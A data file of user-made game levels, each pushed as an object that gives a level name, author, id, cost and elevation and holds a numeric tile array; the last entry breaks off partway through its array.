maps.push({name="show me the path",author="IV",id="#1670920803",direction="forward",cost=384,elevation=9,map=[0,0,0,0,0,0,24,5,2,2,5,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,5,5,5,5,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,5,5,5,5,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,5,5,5,5,24,0,0,90,90,90,90,90,0,0,0,9,9,0,90,199,5,5,5,5,199,77,90,149,0,0,148,98,149,0,0,0,0,0,90,199,46,46,46,46,199,199,199,199,199,199,199,199,90,0,11,0,0,7,7,47,47,47,47,47,96,48,49,49,49,49,49,199,149,0,11,0,0,7,7,47,47,47,47,47,96,48,49,49,65,65,49,199,98,0,0,0,0,0,199,14,97,14,14,199,199,199,199,49,49,49,49,199,149,0,0,13,0,0,0,90,90,90,90,0,23,22,21,49,49,49,49,199,141,0,0,13,0,0,0,0,0,0,0,0,100,0,20,0,66,66,0,199,149,0,0,0,0,0,0,0,0,0,0,0,0,0,54,93,69,69,93,199,148,0,0,15,0,0,0,0,19,0,0,0,23,0,54,48,69,69,48,24,90,0,0,15,0,17,17,0,19,0,0,0,23,0,20,188,66,66,188,199,90,0,0,0,0,0,0,0,0,0,21,0,0,0,0,49,49,49,49,199,149,0,0,0,0,0,0,0,0,0,0,0,0,0,0,51,51,51,51,199,90,199,199,199,199,199,199,199,199,199,199,199,199,199,199,53,53,53,53,199,67,199,161,161,161,161,161,161,161,161,161,161,161,65,65,53,65,65,53,199,0,199,65,65,199,199,199,199,199,199,199,199,199,199,199,53,53,53,53,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,53,100,53,53,0,0]});
maps.push({name="Upper and lower",author="Luffaren",id="#1671115560",direction="right",cost=340,elevation=0,map=[22,2,2,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,22,22,22,22,43,44,44,44,0,0,0,0,0,0,0,0,0,0,22,22,9998,21,21,0,0,0,0,0,0,0,0,0,67,67,0,0,0,0,22,22,22,20,20,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,22,22,22,19,19,0,0,0,0,0,0,0,0,67,12,12,67,0,0,0,22,22,22,18,18,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,89,22,22,17,17,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,22,22,22,16,16,0,0,0,0,0,0,0,0,12,94,12,12,0,0,0,22,22,22,15,15,0,67,67,67,67,67,67,0,12,12,94,12,1,1,1,22,22,22,14,14,5,5,5,5,5,5,5,141,12,93,12,12,1,100,1,22,89,22,13,13,5,5,5,5,5,5,5,141,12,12,93,12,1,122,1,22,22,22,12,12,0,67,67,67,67,67,67,0,12,12,12,12,1,95,1,22,22,22,12,12,0,0,0,0,0,0,0,0,12,12,12,12,1,122,1,22,22,22,12,12,0,0,0,0,0,0,0,0,12,3,3,12,1,95,1,22,22,89,12,12,0,67,67,67,67,67,67,0,12,22,22,12,1,122,1,22,22,22,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,95,1,89,22,22,1,12,90,12,12,90,90,12,12,90,12,12,12,12,90,22,90,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,2,22,22,89,22,22,22,22,22,89,22,22,22,22,22,89,22,22,22,22,2,0,22,22,22,89,22,22,22,22,22,22,22,89,22,22,22,22,89,22,0]});
maps.push({name="Dust 2",author="ZpLit",id="#1671134560",direction="right",cost=304,elevation=-5,map=[0,0,19,19,19,19,19,19,19,2,2,19,19,19,19,19,0,0,0,0,0,19,53,53,53,53,53,53,53,53,53,53,53,53,53,53,19,0,0,0,0,19,53,53,53,53,53,53,53,53,53,53,53,53,53,53,19,0,0,0,0,19,53,53,53,53,53,90,19,53,53,53,53,53,53,53,19,0,0,0,0,19,90,53,53,53,53,53,53,53,19,19,19,19,19,19,19,0,0,0,0,0,19,53,53,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,19,53,53,19,12,93,24,0,0,0,0,0,0,0,0,0,0,0,0,0,19,53,53,19,12,14,12,24,0,0,0,0,0,0,0,0,0,0,0,0,19,53,53,19,12,12,12,12,24,0,0,0,0,0,0,0,0,0,0,24,12,12,12,16,12,12,12,12,12,24,0,0,0,0,0,0,0,0,0,24,12,12,12,12,12,12,12,12,12,24,0,0,0,0,0,19,19,0,24,12,12,12,12,12,12,12,12,12,12,24,23,22,21,20,19,8,8,19,24,12,12,12,12,90,12,12,12,12,12,12,90,13,11,10,9,8,8,8,0,24,12,12,12,14,14,12,12,12,12,12,12,12,11,10,9,8,8,2,0,24,13,13,13,9998,14,12,19,12,90,24,12,12,11,10,9,8,8,2,0,24,13,13,90,13,9998,9998,12,12,87,24,12,12,11,10,9,8,8,8,0,24,13,13,13,9998,14,12,12,16,16,24,14,12,11,10,9,8,8,8,0,24,90,13,13,9998,14,12,12,14,18,58,16,14,11,10,9,19,19,19,0,24,13,13,13,9998,14,12,12,12,12,24,16,14,21,20,19,0,0,0,0,0,24,24,24,24,24,24,24,24,24,24,23,22,0,0,0,0,0,0]});
maps.push({name="Vertigo",author="ZpLit",id="#1671134696",direction="left",cost=298,elevation=6,map=[0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,105,105,1,11,11,11,11,11,11,11,1,0,0,0,0,0,0,0,0,1,105,105,105,45,45,11,11,11,11,11,1,0,0,0,0,0,0,0,0,1,105,105,105,45,45,1,1,1,11,11,1,11,11,94,1,1,1,1,1,1,105,105,105,90,45,1,8,9,10,10,8,8,8,11,11,11,11,11,11,11,45,45,105,45,45,105,6,7,8,8,8,8,8,11,11,11,11,11,11,11,45,45,105,45,45,105,6,7,8,8,8,8,8,11,11,1,1,1,1,11,45,45,105,45,45,105,6,7,8,90,8,8,8,11,2,11,11,11,111,11,11,11,1,11,11,1,1,1,11,8,8,8,8,11,2,11,11,11,1,1,11,1,1,11,11,1,1,1,11,9,9,9,9,11,11,11,11,11,1,1,11,1,1,11,11,1,1,1,9998,10,10,10,10,9998,1,1,11,90,1,11,95,11,11,90,87,11,11,11,11,11,11,11,11,11,0,1,11,90,1,11,11,11,11,11,90,11,11,11,11,11,11,11,11,11,0,1,11,11,111,95,11,11,11,11,11,11,11,11,11,11,11,11,11,11,0,1,11,11,1,11,11,11,15,15,9998,11,11,11,11,11,11,11,90,11,0,1,1,1,1,11,11,11,13,17,93,9998,11,11,11,11,11,11,11,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Olofpass",author="ZpLit",id="#1671135435",direction="forward",cost=360,elevation=2,map=[0,0,24,93,88,24,24,18,17,14,2,2,14,14,14,14,14,24,0,0,0,0,24,15,15,24,24,18,17,90,14,14,14,14,14,14,13,13,24,0,0,24,15,15,15,24,22,22,21,20,54,54,20,20,14,13,13,13,13,24,0,24,15,15,15,22,22,56,55,54,54,54,54,54,20,13,13,13,13,24,24,16,16,16,16,22,56,56,55,54,54,54,54,54,54,20,90,13,13,24,24,16,16,16,22,56,56,56,21,20,20,20,54,54,54,20,90,13,13,24,24,16,16,16,22,56,56,22,0,0,0,0,20,90,54,20,19,13,13,24,24,16,16,16,56,56,56,22,0,0,0,20,54,54,54,13,13,13,13,24,24,16,16,16,56,56,56,22,0,0,0,20,54,54,54,13,13,13,13,24,24,16,16,90,22,56,56,22,0,0,0,0,20,90,54,20,19,13,13,24,24,16,16,19,22,22,22,0,20,20,20,20,54,54,54,20,13,13,13,24,24,16,16,16,22,22,22,22,54,54,54,54,54,54,54,20,13,13,13,24,24,16,16,16,16,16,16,22,54,54,54,54,54,54,20,13,13,13,13,24,24,16,16,16,16,16,16,22,20,54,54,20,20,20,13,13,13,13,13,24,24,16,16,16,16,16,16,22,14,14,14,14,14,14,13,13,13,13,24,0,0,24,16,16,16,16,16,22,14,14,14,14,14,14,14,13,13,24,0,0,0,24,16,16,16,16,24,22,14,14,14,14,16,14,14,14,24,0,0,0,0,24,16,16,16,16,24,22,15,15,15,15,21,21,21,24,0,0,0,0,0,0,24,16,16,16,24,22,16,16,16,16,16,16,195,24,0,0,0,0,0,0,24,16,16,16,16,16,87,2,2,16,16,16,97,24,0,0,0,0]});
maps.push({name="Circus Show",author="thegibbon",id="#1671138305",direction="right",cost=378,elevation=0,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,90,5,5,5,5,5,5,5,5,5,5,199,5,5,5,5,5,5,5,5,5,5,5,5,90,5,5,5,5,5,5,199,5,5,90,1,199,199,199,1,199,199,199,1,199,199,199,1,199,199,195,199,5,5,5,199,1,0,0,0,0,0,0,0,0,0,0,0,187,33,5,5,5,5,5,199,129,37,0,135,135,135,135,135,135,135,135,135,0,127,127,127,95,95,95,199,0,188,0,42,41,40,39,38,37,36,35,34,0,0,196,196,95,5,5,1,0,0,0,188,188,188,188,188,188,188,188,188,0,0,0,0,5,5,5,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,199,0,0,0,0,0,0,0,0,0,0,77,77,41,186,0,0,5,5,5,199,126,0,0,0,0,187,29,127,0,0,0,0,0,0,128,29,5,90,5,199,38,0,0,0,0,0,0,0,0,0,77,77,41,145,0,188,5,5,5,1,188,0,0,0,0,0,0,0,0,0,0,0,0,111,0,0,5,5,97,199,0,0,0,0,0,0,0,0,0,0,0,1,199,98,199,1,96,96,96,199,0,189,0,0,0,0,0,0,0,0,0,199,93,65,93,199,96,90,5,199,126,33,0,0,0,0,0,128,34,186,0,199,93,93,93,199,5,5,5,1,199,199,199,1,199,199,199,1,199,199,199,199,11,11,11,199,5,5,5,5,5,5,5,5,95,5,5,5,5,95,5,5,5,5,5,5,5,5,5,5,5,5,5,5,95,5,5,90,5,95,5,5,5,5,5,2,90,5,90,5,5,5,5,5,95,95,5,5,5,95,95,99,5,5,5,2]});
maps.push({name="Which Do I Press",author="ZpLit",id="#1671145108",direction="forward",cost=249,elevation=0,map=[0,0,0,0,0,0,0,20,20,2,2,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,54,54,54,54,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,54,54,54,54,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,54,54,54,54,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,54,54,54,54,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,54,54,54,54,20,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,54,54,54,54,20,20,20,0,0,0,0,0,0,0,0,0,9998,94,54,20,54,54,54,54,20,54,93,9998,0,0,0,0,0,0,0,0,20,94,54,20,54,54,54,54,20,54,93,20,0,0,0,0,0,0,0,0,9998,94,54,96,54,54,54,54,101,54,93,9998,0,0,0,0,0,0,0,0,0,20,20,199,54,54,54,54,199,20,20,0,0,0,0,0,0,0,0,0,9998,94,54,98,54,54,54,54,103,54,94,9998,0,0,0,0,0,0,0,0,20,94,54,20,54,54,54,54,20,54,94,20,0,0,0,0,0,0,0,0,9998,94,54,20,54,54,54,54,20,54,94,9998,0,0,0,0,0,0,0,0,0,20,20,20,90,54,54,54,20,20,20,0,0,0,0,0,0,0,97,17,17,16,15,14,14,14,14,14,14,15,16,17,17,102,0,0,0,0,17,17,17,16,15,14,195,198,196,195,14,15,16,17,17,17,0,0,0,0,17,17,17,1,1,1,101,101,101,101,1,1,1,17,17,17,0,0,0,0,17,17,17,16,15,14,14,14,14,14,14,15,16,17,17,17,0,0,0,0,99,17,17,16,15,14,14,2,2,14,14,15,16,17,17,104,0,0]});
maps.push({name="Ikea Factory v2",author="sivi",id="#1671214185",direction="right",cost=341,elevation=0,map=[1,1,1,1,1,1,1,1,108,2,2,1,1,1,1,1,1,1,1,1,0,0,1,114,114,114,1,1,90,108,90,1,1,114,114,114,1,0,0,1,0,0,1,114,97,114,1,1,108,108,108,1,1,114,93,114,1,0,0,1,0,1,1,114,114,114,1,1,108,108,108,1,1,114,114,114,1,1,0,1,0,1,19,0,77,0,19,0,8,8,8,0,19,0,77,0,19,1,0,1,172,1,40,0,0,0,40,0,90,8,90,0,40,0,0,0,40,1,169,1,173,1,41,41,41,41,41,41,185,185,185,41,41,41,41,41,41,1,174,1,14,1,40,0,0,0,40,0,8,8,8,0,40,0,0,0,40,1,14,1,188,1,19,0,0,0,19,0,8,8,8,0,19,0,0,0,19,1,188,1,0,1,0,0,0,0,0,0,90,8,90,0,0,14,14,14,90,1,153,1,0,1,0,0,0,0,0,0,8,8,8,10,12,14,90,14,94,1,6,1,0,1,90,8,8,8,8,8,8,8,8,10,12,14,14,14,90,1,154,1,0,1,88,8,8,8,8,8,8,8,8,1,1,1,1,1,1,1,1,1,0,1,90,8,90,8,8,90,8,8,90,1,108,108,108,108,108,108,108,2,0,1,1,1,1,96,96,1,1,1,1,1,108,108,108,108,108,108,108,2,0,0,0,8,1,108,108,186,189,0,0,189,0,0,1,1,1,1,1,1,0,0,0,176,1,188,177,170,8,178,170,8,179,170,1,180,8,0,0,1,0,0,0,170,1,0,0,0,0,0,0,0,0,0,1,170,0,0,0,1,0,0,0,170,1,1,1,1,1,1,1,1,1,1,1,8,0,0,0,1,0,0,0,192,8,170,191,8,170,190,8,170,182,8,170,181,0,0,0,1]});
maps.push({name="Wetlands",author="sivi",id="#1671291184",direction="right",cost=483,elevation=0,map=[0,0,0,12,11,12,11,10,2,2,5,12,14,14,14,14,14,13,11,10,0,0,11,5,90,5,5,5,5,5,11,13,14,93,65,65,67,65,65,67,0,0,12,93,65,65,5,90,5,5,10,12,14,65,65,65,67,65,65,67,0,12,11,65,65,65,5,5,5,5,12,14,14,65,65,65,67,65,65,67,13,10,65,67,65,65,65,5,5,90,11,12,14,65,65,14,14,5,5,5,12,10,65,67,65,65,65,5,5,5,10,13,14,65,65,14,9998,90,5,2,0,12,12,65,65,65,5,90,5,5,11,12,14,65,65,14,141,5,5,2,0,0,13,12,5,90,5,5,5,5,90,12,14,67,67,1,0,5,5,5,0,0,0,0,11,12,12,11,5,5,5,13,24,65,65,1,0,5,5,90,0,0,0,0,0,0,0,1,67,67,67,9998,24,24,24,1,0,5,5,13,0,0,0,1,1,1,1,1,44,44,44,24,24,24,1,0,0,5,5,12,0,0,1,1,108,108,90,1,105,105,105,1,1,1,0,0,5,5,5,13,1,1,1,90,108,108,108,107,106,106,105,1,0,0,0,5,5,5,90,11,1,124,65,67,65,108,108,107,106,106,106,1,67,67,5,90,5,5,5,13,1,124,65,67,65,65,108,107,107,90,1,1,65,65,5,5,5,5,94,14,1,124,65,67,65,65,65,1,1,1,1,65,65,65,65,5,5,5,11,0,1,1,1,108,65,65,65,65,65,65,65,67,65,65,65,5,5,90,14,0,0,0,1,90,108,65,65,65,65,65,65,67,65,65,65,5,5,13,0,0,0,0,1,1,94,90,108,65,65,65,65,67,65,65,5,90,14,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,14,12,13,0,0,0,0]});
maps.push({name="Hallception",author="sivi",id="#1671333858",direction="forward",cost=515,elevation=1,map=[1,2,2,115,1,199,199,199,199,199,199,199,199,1,1,1,199,199,199,1,199,115,115,115,115,115,115,115,115,115,115,115,115,199,77,199,116,116,116,199,199,115,90,115,115,90,115,115,90,115,115,90,115,199,0,199,116,137,116,199,199,115,115,115,115,115,115,115,115,115,115,115,115,199,0,199,116,116,116,199,1,199,199,199,199,199,199,199,199,1,115,115,115,199,0,199,116,116,116,199,1,77,0,0,0,0,0,0,0,199,115,90,115,199,0,199,116,90,116,199,1,199,199,199,199,199,199,1,0,199,115,115,115,199,0,199,116,116,116,199,199,118,118,118,118,118,118,199,0,199,115,115,115,199,0,199,116,116,116,199,199,118,90,118,118,134,118,199,0,199,115,131,115,199,0,199,116,90,116,199,199,118,118,118,118,118,118,199,0,199,115,115,115,199,0,199,116,116,116,199,199,118,118,118,1,199,199,1,0,1,199,199,199,1,0,199,116,116,116,199,199,118,136,118,199,0,0,0,0,0,0,0,0,0,0,199,116,90,116,199,199,118,118,118,199,0,1,199,199,199,1,0,1,199,199,1,116,116,116,199,1,199,199,199,1,0,199,117,117,117,199,0,199,116,116,116,116,116,116,199,1,77,0,0,0,0,199,117,132,117,199,0,199,116,90,116,116,90,116,199,1,199,199,199,199,199,1,117,117,117,199,0,199,116,116,116,116,116,116,199,199,117,117,117,117,117,117,117,117,117,199,0,199,116,116,116,1,199,199,1,199,117,133,117,117,90,117,117,90,117,199,0,199,116,90,116,199,0,154,1,199,117,117,117,117,117,117,117,117,117,199,77,199,116,116,116,199,0,153,1,1,199,199,199,199,199,199,199,199,199,1,1,1,116,2,2,1,1,1,1]});
maps.push({name="Inferno",author="ZpLit",id="#1671339115",direction="forward",cost=244,elevation=1,map=[0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,13,13,13,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,13,13,13,13,13,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,13,13,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,13,13,13,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,13,13,13,13,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,13,13,16,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,13,13,13,13,13,90,13,13,13,1,0,0,0,0,0,0,0,0,0,0,1,13,13,13,13,13,13,13,13,1,0,0,0,0,0,0,0,0,0,0,1,90,90,13,13,13,13,13,13,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,13,13,13,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,13,13,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,13,13,1,0,0,0,0,0,0,1,54,14,14,14,18,14,18,18,15,13,13,13,1,0,0,0,0,0,0,1,54,18,14,14,14,14,14,16,15,13,13,13,1,1,1,1,1,1,0,1,90,14,14,65,65,65,14,14,13,13,13,13,13,13,13,13,13,90,1,1,54,14,14,65,90,65,14,14,13,13,13,13,13,13,13,13,13,13,13,1,90,16,14,65,65,65,14,9998,15,13,13,13,1,1,1,13,13,13,13,1,54,18,14,14,14,14,14,87,15,13,13,13,1,0,1,13,13,13,13,0,1,1,1,1,1,2,2,1,1,1,1,1,0,0,1,93,13,1,1]});
maps.push({name="Ancient",author="ZpLit",id="#1671478696",direction="forward",cost=330,elevation=3,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,0,0,13,13,13,13,13,13,13,13,12,11,10,9,9,9,9,9,9,9,1,0,13,13,13,13,13,13,13,13,12,11,10,9,9,9,9,90,9,9,1,0,13,13,13,13,13,13,19,19,12,11,10,9,19,19,19,19,9,9,1,0,19,19,19,19,53,53,19,19,19,19,19,19,0,0,0,19,10,10,1,0,0,0,19,53,53,53,53,53,19,12,12,19,19,19,19,19,11,11,1,0,0,0,19,53,53,53,53,53,19,12,12,12,12,12,12,12,12,12,1,0,0,0,0,19,19,19,19,53,19,19,12,12,12,12,12,12,12,12,1,0,0,0,0,0,0,19,53,53,53,19,12,12,12,87,12,14,15,1,0,0,0,0,0,0,0,19,53,53,53,19,12,1,1,12,12,12,13,1,0,0,0,0,0,0,0,19,53,53,53,12,12,1,1,12,12,14,15,1,0,0,0,0,0,0,0,19,53,53,53,12,12,12,12,12,12,12,12,1,0,0,0,0,0,0,0,19,53,90,53,19,12,12,12,12,12,12,12,1,0,0,0,1,1,0,1,1,19,19,19,19,12,12,19,19,19,19,12,12,1,0,1,52,52,1,12,12,19,0,0,19,12,12,19,0,0,19,12,12,1,0,1,52,52,52,12,12,19,0,0,19,12,12,19,0,0,19,12,12,12,1,1,52,52,52,12,12,19,19,19,19,12,12,19,19,19,19,12,12,12,1,1,93,52,1,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,0,1,1,1,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,0,0,0,0,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,0]});
maps.push({name="Mirage",author="ZpLit",id="#1671479075",direction="forward",cost=308,elevation=1,map=[0,23,23,9998,0,0,0,0,15,49,2,2,17,17,0,0,0,0,0,0,23,57,22,93,9998,0,0,0,15,49,49,49,51,51,17,0,0,0,0,0,23,57,57,57,23,0,0,0,16,50,50,50,9998,51,17,0,0,0,0,0,23,57,22,57,23,0,0,0,17,51,51,51,51,51,17,0,0,0,0,0,23,57,57,57,23,23,0,0,0,17,17,51,51,51,17,0,0,0,0,0,23,57,23,23,23,17,23,23,23,11,11,11,11,11,23,0,0,0,0,0,23,57,23,51,51,3,51,23,23,11,11,11,11,11,23,0,0,0,0,0,23,57,57,51,51,51,51,15,13,11,11,11,11,13,23,0,0,0,0,0,0,23,23,11,11,11,11,11,11,11,11,11,15,15,23,0,0,0,0,0,23,11,11,11,15,15,11,11,11,11,11,11,15,23,23,0,0,0,0,0,23,11,11,11,13,13,11,11,11,11,11,11,11,23,0,0,0,0,0,0,23,13,11,11,11,11,11,11,11,11,11,11,11,23,23,23,23,0,23,23,23,11,11,11,11,11,11,11,11,11,11,11,15,14,13,12,11,23,11,11,23,11,11,87,13,13,11,11,11,11,11,11,11,11,11,9998,11,11,11,11,23,11,11,11,15,15,11,11,11,11,11,11,11,11,11,11,11,11,11,11,23,11,11,11,11,11,11,90,90,11,90,90,11,11,11,11,11,23,11,11,23,15,13,11,11,23,23,23,23,23,23,23,11,11,11,11,23,0,23,23,23,11,11,11,23,0,0,0,0,0,0,0,23,11,11,11,11,23,11,11,23,10,10,10,10,23,0,0,0,0,0,0,23,11,11,11,11,11,11,11,23,10,2,2,10,23,0,0,0,0,0,0,0,23,23,23,23,23,23,23]});
maps.push({name="Hothead KZ",author="sivi",id="#1671488441",direction="forward",cost=300,elevation=0,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,0,0,0,0,0,0,0,0,1,90,113,112,111,110,109,109,109,109,90,1,0,0,0,0,0,0,0,0,1,134,113,112,111,110,109,109,109,109,109,1,0,0,0,0,0,0,0,0,1,9998,113,1,1,1,1,90,109,109,109,1,0,0,0,0,0,0,0,0,1,9998,5,5,5,133,199,109,109,109,90,1,0,0,0,0,0,0,0,0,1,3,9998,5,5,9998,199,109,109,109,109,1,0,0,0,0,0,0,0,0,1,9998,5,5,5,9998,199,109,109,109,109,1,0,0,0,0,0,0,0,0,1,12,5,5,5,9998,199,109,109,109,90,1,0,0,0,0,0,0,153,0,1,13,5,5,5,9998,199,109,109,109,109,1,0,0,0,0,0,157,17,0,1,1,1,11,5,9998,199,109,109,109,109,1,0,0,0,0,0,0,154,0,1,5,5,5,5,9998,1,90,109,109,90,1,0,0,0,0,0,0,0,0,1,13,5,5,5,9998,1,1,95,95,1,1,0,0,0,0,0,0,0,0,1,1,5,5,5,9998,1,1,109,109,1,1,0,0,0,0,0,0,0,0,1,9,5,5,5,133,1,1,95,95,1,1,0,0,0,0,0,0,0,0,1,109,109,109,109,90,1,90,109,109,132,1,0,0,0,0,0,0,0,0,1,109,109,109,109,93,199,109,109,109,109,1,0,0,0,0,0,0,0,0,1,131,109,109,109,93,199,109,109,109,109,1,0,0,0,0,0,0,0,0,1,109,109,109,109,93,199,109,109,109,109,1,0,0,0,0,0,0,0,0,1,90,109,109,109,90,1,90,109,109,90,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1]});
maps.push({name="Under the Sea",author="sivi",id="#1671633894",direction="forward",cost=383,elevation=0,map=[0,1,1,1,1,1,1,1,115,2,2,1,1,1,1,1,1,1,0,0,0,1,1,1,1,1,1,1,115,115,115,1,1,1,1,1,1,1,0,0,0,1,1,7,90,7,7,7,15,15,15,7,7,7,90,7,1,1,0,0,0,1,7,7,7,7,132,7,15,90,15,7,134,7,7,7,7,1,0,0,0,1,90,7,7,7,7,7,15,15,15,7,7,7,7,7,90,1,0,0,0,1,7,7,7,15,15,15,15,15,15,15,15,15,7,7,7,1,0,0,0,1,88,7,90,15,131,15,15,90,15,15,133,15,90,7,88,1,0,0,0,1,7,7,7,15,15,15,15,15,15,15,15,15,7,7,7,1,0,0,0,1,90,7,7,7,90,7,94,90,93,7,90,7,7,7,90,1,153,0,0,1,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,1,14,186,0,1,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,1,154,0,0,1,90,7,7,7,90,7,93,90,94,7,90,7,7,7,90,1,157,0,0,1,7,7,7,15,15,15,15,15,15,15,15,15,7,7,7,1,0,0,0,1,88,7,90,15,139,15,15,90,15,15,137,15,90,7,88,1,0,0,0,1,7,7,7,15,15,15,15,15,15,15,15,15,7,7,7,1,0,0,0,1,90,7,7,7,7,7,15,15,15,7,7,7,7,7,90,1,0,0,0,1,7,7,7,7,138,7,15,90,15,7,136,7,7,7,7,1,0,0,0,1,1,7,90,7,7,7,15,15,15,7,7,7,90,7,1,1,0,0,0,1,1,1,1,1,1,1,115,115,115,1,1,1,1,1,1,1,0,0,0,1,1,1,1,1,1,1,115,2,2,1,1,1,1,1,1,1,0,0]});
maps.push({name="Under the Sea",author="sivi",id="#1671656059",direction="forward",cost=409,elevation=0,map=[1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,1,0,1,94,90,116,116,116,90,116,116,116,90,116,116,116,90,116,131,116,1,0,1,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,1,0,1,5,5,5,5,5,5,90,10,9,11,10,11,13,11,13,11,13,1,0,1,5,132,5,5,5,5,5,5,5,5,5,5,9,11,11,10,12,1,0,1,5,5,90,10,9,5,5,5,5,5,5,5,5,5,5,5,90,1,0,1,12,13,11,13,10,12,13,11,9,9,90,5,5,5,5,5,5,1,0,1,11,11,10,10,12,12,10,12,13,10,10,12,13,11,12,5,5,1,157,1,12,10,9,5,5,5,5,5,90,12,13,10,11,13,5,5,5,1,154,1,13,11,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,14,1,11,10,5,90,5,12,11,5,5,5,5,5,5,5,5,90,12,1,153,1,13,13,5,5,5,10,11,10,11,10,12,10,9,11,10,11,13,1,0,1,13,11,5,5,5,5,90,11,9,10,12,11,13,12,90,5,5,1,0,1,12,13,12,5,5,5,5,5,5,5,5,5,5,5,5,133,5,1,0,1,13,11,13,13,11,5,5,5,5,5,90,5,5,5,5,5,5,1,0,1,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,1,0,1,116,134,116,90,116,116,116,90,116,116,116,90,116,116,116,90,93,1,0,1,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,0]});
maps.push({name="To The Hellfire",author="ZpLit",id="#1671838635",direction="forward",cost=357,elevation=0,map=[0,0,0,0,0,0,0,77,77,77,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,77,77,1,1,1,77,0,5,5,5,5,5,0,0,0,0,0,0,0,77,1,1,31,0,29,1,77,0,5,5,75,5,5,0,0,0,0,0,77,1,33,0,0,0,0,27,1,77,0,0,5,5,75,5,0,0,0,77,1,0,0,0,0,0,0,0,0,1,77,0,0,5,5,5,0,0,77,1,34,0,0,0,77,0,0,0,0,26,1,77,0,5,75,5,5,0,77,1,0,0,0,77,24,77,0,0,0,0,0,1,77,0,5,75,5,77,1,36,0,0,77,24,24,24,77,0,0,0,0,1,77,0,5,5,5,77,1,0,0,0,77,24,24,24,24,77,0,94,5,5,9998,5,5,5,5,77,1,38,0,0,0,77,24,24,24,77,0,94,5,5,9998,5,5,5,5,0,77,1,0,0,0,0,77,24,24,24,77,0,0,1,77,0,5,75,5,0,77,1,40,0,0,0,0,77,24,24,24,77,0,1,77,0,5,5,5,0,0,77,1,0,0,0,0,77,24,24,24,24,1,77,0,0,5,5,5,0,0,77,1,42,0,0,1,1,77,24,24,1,77,0,0,5,75,5,5,0,0,0,77,1,44,44,93,93,1,77,1,77,0,0,0,5,5,5,0,0,0,0,0,77,1,1,124,124,1,1,77,0,0,0,5,75,5,5,0,0,0,0,0,0,77,67,65,65,67,77,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,0,0,0,5,5,5,75,5,5,0,0,0,0,0,0,0,0,0,5,5,5,95,95,5,75,5,5,5,0,0,0,0,0,0,0,0,0,0,2,2,5,95,95,5,5,5,0,0,0,0,0]});
maps.push({name="HighRiseWindowWasher",author="alli",id="#1672134617",direction="forward",cost=179,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,105,105,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,105,105,1,0,0,0,0,0,0,0,0,0,0,0,189,0,0,105,105,105,105,105,1,0,0,0,0,0,0,0,0,0,0,0,13,3,0,105,105,105,105,105,1,0,0,0,0,0,0,0,0,0,0,0,170,173,13,1,105,105,105,105,1,0,0,0,0,0,0,0,0,0,0,0,189,0,188,1,90,105,105,90,1,0,0,0,0,0,0,0,0,0,0,0,13,3,189,199,105,105,105,105,1,0,0,0,0,0,0,0,0,0,0,0,170,175,13,199,105,105,105,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,189,199,105,105,105,105,1,0,0,0,0,0,0,0,0,0,0,0,0,3,13,199,105,105,105,105,1,0,0,0,0,0,0,0,0,0